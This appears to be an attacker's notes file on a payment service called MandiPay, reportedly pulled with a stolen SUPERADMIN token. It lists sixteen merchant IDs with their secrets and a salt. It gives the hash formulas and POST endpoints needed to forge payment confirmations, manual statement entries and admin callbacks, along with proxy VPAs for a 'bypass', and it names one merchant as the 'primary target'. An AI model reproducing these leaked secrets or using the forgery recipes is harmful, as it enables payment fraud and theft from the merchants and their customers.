# MandiPay — Merchant Secrets Cache

> **Pulled**: 2026-09-27 02:43 IST  
> **Source**: `/api/v1/upi/merchant/list` via stolen SUPERADMIN token  
> **Salt**: `xCrBYtsJmcMq3dJP`

## All Merchants (16)

| MID | Name | Secret | Reseller | MDR | Ticket Range |
|-----|------|--------|----------|-----|--------------|
| `E3D47F789D1842C1BC2CA021B289B79C` | MANDI-AGENT-TEST | `0BFD188422B0452A8FA6CC85862A8616` | MANDI-HQ-TEST | 5.5% | ₹500–25k |
| `07E5663298134C7FB76D5C17D7183BE8` | DVD | `BB09571348AB4CA7A7A4F449A9BA37CD` | DVD | 5.5% | ₹500–25k |
| `00523EBF53334B43AE321424BA91F286` | GWAY | `8215125FD8E1412488CB742E998D1AEB` | GWAY | 5.5% | ₹500–25k |
| `9368B40BDA5143B1ADCFA833C274FE8E` | BQRB-API | `52AA7F0E58B74B4CB841C191A15C486E` | BQRB | 5.5% | ₹500–25k |
| `B0331F73BC224A8598BFCC5F2280D0F5` | 2020EXCH | `CFC9D91C615A4580B6D8545219721F75` | GWAY | 5.5% | ₹500–25k |
| `F09284ADF17D49FDAC6F1E8B94BB0D70` | 2020GAMES | `089FCF0E126B41E5B3963C08CD1E3267` | GWAY | 5.5% | ₹500–25k |
| `97C5851E931949C9A55E7498C5E95A15` | **ORMPAY** | `B03D0449FE944F81B2AC5736FFF631E6` | ORMPAY | 5.5% | ₹500–25k |
| `94A3353287AE45498CF8783F6DC31723` | Elitepay | `9697520C41C74915AFE5E41B0092C1A7` | Elitepay | 5.5% | ₹500–25k |
| `1D388DEBB7014594BA1B01579257A68A` | Xpaysafe | `8CD7C73601AC4ECDB025A355DB29E454` | Xpaysafe | 5.5% | ₹500–25k |
| `3C61B99DEC994C01AFFE8FB036FC9BCD` | AAND | `A7D942F257924BA58387A5CBA29A2CB4` | AAND | 5.5% | ₹500–25k |
| `94E9D2AA722A4B83BC3DEA14F5637376` | **TripleSeven** | `E28322A599A749C589CA0F201585ECB7` | W777 | 5.5% | ₹500–25k |
| `DD487C67496F452F81C4B4E4C8B33571` | MGLION | `4666468ECBC64EE9905FEBF3A15A72A7` | MGLION | 5.5% | ₹500–100k |
| `1ECD07F3E5EB47118FF46048A4106E99` | RGV | `F5F474D9F5344CC5B0DAC4FCCBC60B6F` | RGV | 5.5% | ₹500–100k |
| `6AA94C06DDB842E2A88502426DCD9A7A` | Elitepayout | `6DB340654CE4451F86DDE70440CBAB88` | Elitepay | 5.5% | ₹1k–25k |
| `A1813214A63C4DD9B82DAA8C7B7DE00F` | ALTRON | `B2F4C3182A83488FA07557FD2B9E96FD` | ALTRON | 5.5% | ₹500–100k |
| `589F3C9C8CFE42478B122824581E9FA9` | EZP | `444134E77D164FB89B795F6EEEB5E5DA` | EZP | 5.5% | ₹1k–25k |

## Usage

### Payment Page Confirm Hash
```
hash = SHA256(utr + requestId + merchantSecret)
POST /api/v1/upi/payin/update/{mid_uuid}/{utr}/{hash}
```

### Statement Manual Hash
```
hash = SHA256(vpa + utr + amount + salt)
POST /api/v1/upi/api/statement/manual?user={username}
Body: {"vpa": proxyVpa, "utr": utr, "amount": amount, "hash": hash}
```

### Admin Confirm Hash
```
hash = SHA256("PAYIN_CALLBACK" + reqId + mid + txnId + utr + "SUCCESS_AUTO" + amount + amount + salt)
POST /api/v1/upi/payin/update/manual/admin?user={username}
```

## Known Non-Google Proxy VPAs (for statement/manual bypass)
- `9664348959@mairtel`
- `bharatpe2k0r0q8q0t27607@unitype`

## Key Intel
- `validateHash: false` on ALL merchants — hash validation is **disabled**
- All use `redirectType: INTERNAL` and `flowType: NORMAL`
- ORMPAY (MID `97C5851E`) is the primary target — handles Wolf777/7Mojos deposits
